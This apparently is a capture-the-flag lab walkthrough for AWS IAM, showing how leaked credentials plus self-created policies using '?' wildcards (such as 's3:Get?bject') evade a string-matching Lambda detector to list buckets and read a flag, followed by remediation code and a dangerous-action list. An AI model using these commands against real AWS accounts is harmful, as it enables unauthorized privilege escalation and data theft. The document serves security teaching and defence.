# Obfuscated Policy - Walkthrough

> **Security Note**: Use placeholders for all AWS Account IDs, Access Keys, and Secret Keys.
> - Account ID: `123456789012`
> - Access Key: `AKIAIOSFODNN7EXAMPLE` or `ASIAXXXXXXXXXXX`
> - Secret Key: `xxxxxxxx` or mask actual values
> - Scenario ID suffix: `xxxxxxxx`

## Attack Path

```mermaid
flowchart TB
    A[Leaked Access Key] --> B[Identity Confirmation]
    B --> C[Permission Enumeration]
    C --> D[Try literal s3:ListAllMyBuckets policy]
    D -->|Lambda deletes it| E[Bypass: Action s3:List?llMyBuckets]
    E --> F[Attach + s3 ls -> bucket name]
    F --> G[Try literal s3:GetObject policy]
    G -->|Lambda deletes it| H[Bypass: Action s3:Get?bject]
    H --> I[Attach + GetObject]
    I --> J[FLAG]
```

## Step 1: Identity Confirmation

Verify who you are with the leaked credentials.

```bash
aws sts get-caller-identity --profile attacker
```

![Identity confirmation](./assets/1.png)

You are an IAM user under `gnawlab/gnawlab-iampoly-attacker-xxxxxxxx`.

## Step 2: Permission Enumeration

Always enumerate every permission source: user inline, user attached, group membership, group inline, group attached.

```bash
USER_NAME="gnawlab-iampoly-attacker-xxxxxxxx"

# User inline policies
aws iam list-user-policies --user-name "$USER_NAME" --profile attacker
```

![List user policies](./assets/2.png)

```bash
# Read the inline policy contents
aws iam get-user-policy \
  --user-name "$USER_NAME" \
  --policy-name gnawlab-iampoly-attacker-policy-xxxxxxxx \
  --profile attacker
```

![Get user policy](./assets/3.png)

```bash
# User attached managed policies
aws iam list-attached-user-policies --user-name "$USER_NAME" --profile attacker

# Group memberships
aws iam list-groups-for-user --user-name "$USER_NAME" --profile attacker
```

Both return empty. The user has no group memberships and no managed policies.

**Findings:**
- Identity / self-enumeration permissions only.
- `iam:CreatePolicy` (any policy) + `iam:AttachUserPolicy` (self only) — the only privilege escalation primitive available.
- No direct S3 access.

## Step 3: Reconnaissance - Discover the Detector

Try a "naive" policy to see how the detection system reacts.

```bash
cat > /tmp/naive-list.json <<'JSON'
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": "s3:ListAllMyBuckets",
    "Resource": "*"
  }]
}
JSON
```

![Create naive list policy file](./assets/4.png)

```bash
aws iam create-policy \
  --policy-name naive-list \
  --policy-document file:///tmp/naive-list.json \
  --profile attacker
```

![Create naive list policy](./assets/5.png)

The policy is created. Wait 30-60 seconds, then check again:

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --profile attacker --query Account --output text)
aws iam get-policy \
  --policy-arn "arn:aws:iam::${ACCOUNT_ID}:policy/naive-list" \
  --profile attacker
```

![NoSuchEntity for naive list](./assets/6.png)

`NoSuchEntity` confirms the detection Lambda deleted the policy. The detector reads `CreatePolicy` events from CloudTrail (via EventBridge) and inspects the policy JSON for blocked literal strings. `"s3:ListAllMyBuckets"` is one of them.

## Step 4: Exploit Phase 1 - Bucket Enumeration via Wildcard Obfuscation

AWS IAM evaluates `?` and `*` characters as wildcards **inside the action name portion only** (the part after the colon). The vendor portion (before the colon) must be a literal name like `s3`; AWS rejects policies with wildcards in the vendor (`MalformedPolicyDocument: Action vendors must not contain wildcards`).

The detector's literal pattern `"s3:ListAllMyBuckets"` does not match the string `"s3:List?llMyBuckets"`, but the IAM engine resolves the latter to `s3:ListAllMyBuckets` semantically.

Pattern derivation:

```
s3:List?llMyBuckets
^^                  s3 literal vendor
   ^^^^^            :List literal
        ^           ?  -> A
         ^^^^^^^^^^ llMyBuckets literal
                  = s3:ListAllMyBuckets
```

```bash
cat > /tmp/list-bypass.json <<'JSON'
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": "s3:List?llMyBuckets",
    "Resource": "*"
  }]
}
JSON
```

![Create list bypass policy file](./assets/7.png)

```bash
LIST_ARN=$(aws iam create-policy \
  --policy-name list-bypass \
  --policy-document file:///tmp/list-bypass.json \
  --profile attacker \
  --query 'Policy.Arn' --output text)

echo "$LIST_ARN"
```

![Create list bypass policy](./assets/8.png)

Wait 30-60 seconds and confirm the policy is still alive:

```bash
aws iam get-policy --policy-arn "$LIST_ARN" --profile attacker
```

The policy survives. Attach it to your own user:

```bash
aws iam attach-user-policy \
  --user-name "$USER_NAME" \
  --policy-arn "$LIST_ARN" \
  --profile attacker
```

![Attach list bypass policy](./assets/9.png)

> **Note:** IAM permission propagation typically takes 30-60 seconds after attaching a policy. If `aws s3 ls` returns `AccessDenied` immediately after attach, wait another minute and retry.

Now enumerate buckets:

```bash
sleep 60
aws s3 ls --profile attacker
```

![List buckets](./assets/10.png)

The flag bucket name is now visible (`gnawlab-iampoly-flag-xxxxxxxx`).

## Step 5: Exploit Phase 2 - Read the Flag via Wildcard Obfuscation

First confirm that a literal `s3:GetObject` policy is also blocked.

```bash
FLAG_BUCKET="gnawlab-iampoly-flag-xxxxxxxx"

cat > /tmp/naive-get.json <<JSON
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": "s3:GetObject",
    "Resource": "arn:aws:s3:::${FLAG_BUCKET}/*"
  }]
}
JSON
```

![Create naive get policy file](./assets/15.png)

```bash
aws iam create-policy \
  --policy-name naive-get \
  --policy-document file:///tmp/naive-get.json \
  --profile attacker
```

![Create naive get policy](./assets/16.png)

After ~30-60 seconds, verify deletion:

```bash
aws iam get-policy \
  --policy-arn "arn:aws:iam::${ACCOUNT_ID}:policy/naive-get" \
  --profile attacker
```

![NoSuchEntity for naive get](./assets/17.png)

Now use the wildcard-obfuscated equivalent (vendor stays literal `s3:`, action name uses `?`):

```
s3:Get?bject
^^             s3 literal vendor
   ^^^^        :Get literal
       ^       ?  -> O
        ^^^^^  bject literal
              = s3:GetObject
```

```bash
cat > /tmp/get-bypass.json <<JSON
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": "s3:Get?bject",
    "Resource": "arn:aws:s3:::${FLAG_BUCKET}/*"
  }]
}
JSON
```

![Create get bypass policy file](./assets/11.png)

```bash
GET_ARN=$(aws iam create-policy \
  --policy-name get-bypass \
  --policy-document file:///tmp/get-bypass.json \
  --profile attacker \
  --query 'Policy.Arn' --output text)
```

![Create get bypass policy](./assets/12.png)

```bash
aws iam attach-user-policy \
  --user-name "$USER_NAME" \
  --policy-arn "$GET_ARN" \
  --profile attacker
```

![Attach get bypass policy](./assets/13.png)

## Step 6: Capture the Flag

Wait for IAM permission propagation, then read the flag:

```bash
sleep 60
aws s3 cp "s3://${FLAG_BUCKET}/flag.txt" - --profile attacker
```

![Capture the flag](./assets/14.png)

Output:

```
FLAG{iam_wildcard_obfuscation_bypass_complete}
```

---

## Attack Chain Summary

```
1. Identity Confirmation (sts:GetCallerIdentity)
   |
2. Permission Enumeration
   - iam:ListUserPolicies / iam:GetUserPolicy
   - iam:ListAttachedUserPolicies
   - iam:ListGroupsForUser
   |
3. Detection Reconnaissance
   - Create literal s3:ListAllMyBuckets policy -> deleted by Lambda
   |
4. Wildcard Obfuscation - Bucket Enumeration
   - Action: s3:List?llMyBuckets  (IAM = s3:ListAllMyBuckets)
   - Survives detector, attach to self, list buckets
   |
5. Wildcard Obfuscation - Object Read
   - Confirm s3:GetObject literal is also deleted
   - Action: s3:Get?bject  (IAM = s3:GetObject)
   - Survives detector, attach to self
   |
6. FLAG{iam_wildcard_obfuscation_bypass_complete}
```

---

## Key Techniques

### IAM Action Wildcards

AWS IAM Action values support two wildcard characters **inside the action name portion** (the part after the colon):

| Character | Meaning |
|-----------|---------|
| `*` | Matches any sequence of zero or more characters |
| `?` | Matches exactly one character |

The service vendor portion (before the colon) must be a literal name like `s3`, `ec2`, etc. AWS rejects policies that contain wildcards in the vendor with `MalformedPolicyDocument: Action vendors must not contain wildcards`. The exceptions are the special forms `*` and `*:*`, which AWS accepts as full wildcards.

IAM also matches Action values **case-insensitively** in the vendor portion (`s3` and `S3` are equivalent). The IAM engine resolves wildcards before evaluating an authorization decision, so `s3:Get?bject` and `s3:GetObject` are semantically equivalent.

### Why the Detector Fails

The detection Lambda searches the policy JSON document for blocked literal strings using `re.search(pattern, policy_str, re.IGNORECASE)`. Case-insensitive matching neutralizes trivial bypasses such as `S3:GetObject`. The Lambda also blocks common verb-prefix wildcards like `s3:Get*` and `s3:List*`. However, the detector cannot match the literal `"s3:GetObject"` against the string `"s3:Get?bject"` — the `?` is not the literal character `O`.

The IAM engine and the detector evaluate the Action string at different layers:

| Layer | Sees `s3:Get?bject` as |
|-------|-----------------------|
| Detector (string match) | Different from any blocked literal |
| IAM engine (semantic) | Equal to `s3:GetObject` |

---

## Lessons Learned

### 1. String Detection Is Insufficient

Pattern-based detection cannot represent the full set of strings that resolve to a dangerous action under IAM wildcard rules. Any non-trivial literal can be obfuscated by replacing one or more characters with `?`.

### 2. Use Semantic Validation

```python
# Bad: literal pattern check
re.search(r'"s3:GetObject"', policy_str, re.IGNORECASE)

# Better: enumerate the action under IAM wildcard semantics
import fnmatch

DANGEROUS_ACTIONS = ["s3:GetObject", "s3:ListAllMyBuckets", ...]

def resolves_to_dangerous(action: str) -> bool:
    return any(
        fnmatch.fnmatchcase(target.lower(), action.lower())
        for target in DANGEROUS_ACTIONS
    )

# Best: IAM ValidatePolicy / Access Analyzer
import boto3
accessanalyzer = boto3.client('accessanalyzer')
accessanalyzer.validate_policy(
    policyDocument=policy_str,
    policyType='IDENTITY_POLICY'
)
```

### 3. Constrain Resource ARNs in IAM Policies

Even when the Action is correctly evaluated, scoping the Resource field to a precise ARN limits damage. The least-privilege practice for `iam:AttachUserPolicy` is to constrain `Resource` to the specific user (as this scenario does).

### 4. Defense in Depth

- Pair real-time pattern detection with **AWS Access Analyzer** scheduled scans.
- Use **SCPs** at the AWS Organizations level (or **IAM Permission Boundaries** for single-account environments, as this scenario does) to deny dangerous actions outright (`iam:CreateUser`, `iam:PassRole`, `lambda:UpdateFunctionCode`, `cloudtrail:StopLogging`, etc.). These cannot inspect policy documents, but they prevent unrelated escalation paths so detection logic can stay focused on its true target.
- Monitor `iam:CreatePolicy` and `iam:AttachUserPolicy` with high signal-to-noise alerts and require human review when wildcards appear in Action values.

---

## Remediation

### Replace Pattern Match With Semantic Check

```python
import fnmatch
import json

DANGEROUS_ACTIONS = [
    "s3:GetObject",
    "s3:GetObjectVersion",
    "s3:ListAllMyBuckets",
    "s3:ListBucket",
    "secretsmanager:GetSecretValue",
    "iam:CreateAccessKey",
    "iam:PassRole",
]


def expand_actions(statement_actions):
    if isinstance(statement_actions, str):
        return [statement_actions]
    return list(statement_actions)


def is_dangerous(policy_document):
    for stmt in policy_document.get("Statement", []):
        if stmt.get("Effect") != "Allow":
            continue
        actions = expand_actions(stmt.get("Action", []))
        for action in actions:
            for target in DANGEROUS_ACTIONS:
                # IAM wildcard semantics: case-insensitive fnmatch
                if fnmatch.fnmatchcase(target.lower(), action.lower()):
                    return True
    return False
```

### Use AWS Access Analyzer ValidatePolicy

```python
import boto3

accessanalyzer = boto3.client("accessanalyzer")
result = accessanalyzer.validate_policy(
    policyDocument=json.dumps(policy_document),
    policyType="IDENTITY_POLICY",
)

for finding in result.get("findings", []):
    if finding["findingType"] in ("ERROR", "SECURITY_WARNING"):
        # Reject the policy
        ...
```
